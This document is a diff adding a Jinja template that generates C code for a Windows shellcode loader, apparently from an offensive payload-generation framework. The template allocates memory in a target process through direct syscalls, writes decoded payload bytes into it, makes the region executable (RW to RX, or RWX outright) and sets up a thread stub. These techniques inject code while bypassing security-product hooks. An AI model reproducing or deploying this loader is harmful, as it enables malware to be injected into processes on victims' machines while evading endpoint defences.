@@ -1,0 +1,28 @@
+{% from "macros.jinja" import syscall_call, createThreadStub with context %}
+
+{% if section == "globals" %}
+    {% include "lib/syscalls.jinja" %}
+
+    void *alloc(void *decoded, SIZE_T length, HANDLE hProc){
+        NTSTATUS status;
+        DWORD SyscallId = 0;
+        LPVOID pRemoteCode = NULL;
+        SIZE_T szWmResv = length;
+
+        {% if protection == "rx" %}
+            {{ syscall_call("ZwAllocateVirtualMemory", "hProc,&pRemoteCode, NULL,&length,MEM_COMMIT,PAGE_READWRITE") }}
+            {{ createThreadStub("decoded", "pRemoteCode") }}
+            {{ syscall_call("NtWriteVirtualMemory", "hProc, pRemoteCode, (PVOID) decoded, length, (SIZE_T*) NULL") }}
+
+            DWORD oldProt;
+            {{ syscall_call("NtProtectVirtualMemory", "hProc,&pRemoteCode, &szWmResv,PAGE_EXECUTE_READ,&oldProt") }}
+        {% else %}
+            {{ syscall_call("ZwAllocateVirtualMemory", "hProc,&pRemoteCode, NULL,&length,MEM_COMMIT,PAGE_EXECUTE_READWRITE") }}
+            {{ createThreadStub("decoded", "pRemoteCode") }}
+            {{ syscall_call("NtWriteVirtualMemory", "hProc, pRemoteCode, (PVOID) decoded, length, (SIZE_T*) NULL") }}
+        {% endif %}
+        return pRemoteCode;
+    }
+{% else %}
+    void *mem = alloc(raw, length, hProc);
+{% endif %}
